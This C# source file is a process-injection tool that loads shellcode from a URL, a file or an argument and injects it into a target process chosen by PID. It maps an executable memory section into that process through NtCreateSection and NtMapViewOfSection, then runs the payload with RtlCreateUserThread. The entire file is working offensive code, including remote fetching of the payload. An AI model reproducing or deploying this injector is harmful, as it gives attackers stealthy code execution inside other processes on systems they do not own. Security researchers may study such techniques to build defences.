using System;
using tRWXia.Utils;
using System.Collections.Generic;
using tRWXi.Utils;
using System.Runtime.InteropServices;

namespace tRWXia
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Dictionary<string,string> param = ArgParser.parse(args);

            uint pid = 0;
            uint size = 0;
            byte[] data = { };
            try
            {
                pid = Convert.ToUInt32(param["pid"]);
                if (param.ContainsKey("url"))
                {
                    data = Shellcoder.fetch(param["url"]);
                }
                else if (param.ContainsKey("data"))
                {
                    data = Shellcoder.convert(param["data"]);
                }
                else if (param.ContainsKey("file"))
                {
                    data = Shellcoder.convert(System.IO.File.ReadAllText(param["file"]));
                }
                else
                {
                    Console.WriteLine("[-] no data provided");
                    Helper.help();
                    Environment.Exit(1);
                }
                size = (uint)data.Length;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: {0}", ex.Message);
                Helper.help();
                Environment.Exit(1);
            }

            IntPtr sectionHandle = IntPtr.Zero;
            UInt32 res = Unmanaged.NtCreateSection(ref sectionHandle, Unmanaged.SECTION_MAP_EXECUTE | Unmanaged.SECTION_MAP_READ | Unmanaged.SECTION_MAP_WRITE, IntPtr.Zero, ref size, Unmanaged.PAGE_EXECUTE_READWRITE, Unmanaged.SEC_COMMIT, IntPtr.Zero);
            if (res == 0)
            {
                Console.WriteLine("[+] created RWX memory section: [0x{0}] -> [{1}] bytes", sectionHandle.ToString("X"), size);
            }
            ulong sectionOffset;
            uint viewSize;
            IntPtr baseAddress = IntPtr.Zero;
            res = Unmanaged.NtMapViewOfSection(sectionHandle, Unmanaged.GetCurrentProcess(), ref baseAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out viewSize, 2, 0, Unmanaged.PAGE_READWRITE);
            if (res == 0)
            {
                Console.WriteLine("[+] created RW memory section view in the current process. Address: [0x{0}]. Section offset: [{1}]. View size: [{2}].", baseAddress.ToString("X"), sectionOffset, viewSize);
            }
            Marshal.Copy(data, 0, baseAddress, (int)size);
            IntPtr targetAddress = IntPtr.Zero;
            IntPtr targetHandle = Unmanaged.OpenProcess(Unmanaged.PROCESS_ALL_ACCESS, false, pid);
            res = Unmanaged.NtMapViewOfSection(sectionHandle, targetHandle, ref targetAddress, UIntPtr.Zero, UIntPtr.Zero, out sectionOffset, out viewSize, 2, 0, Unmanaged.PAGE_EXECUTE_READ);
            if (res == 0)
            {
                Console.WriteLine("[+] creted RX memory section view in the remote process. Address: [0x{0}]. Section offset: [{1}]. View size: [{2}].", targetAddress.ToString("X"), sectionOffset, viewSize);
            }
            Console.WriteLine("[*] executing code...");
            IntPtr tHandle = IntPtr.Zero;
            Unmanaged.RtlCreateUserThread(targetHandle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, targetAddress, IntPtr.Zero, ref tHandle, IntPtr.Zero);
            Unmanaged.WaitForSingleObject(tHandle, Unmanaged.INFINITE);
        }
    }

}
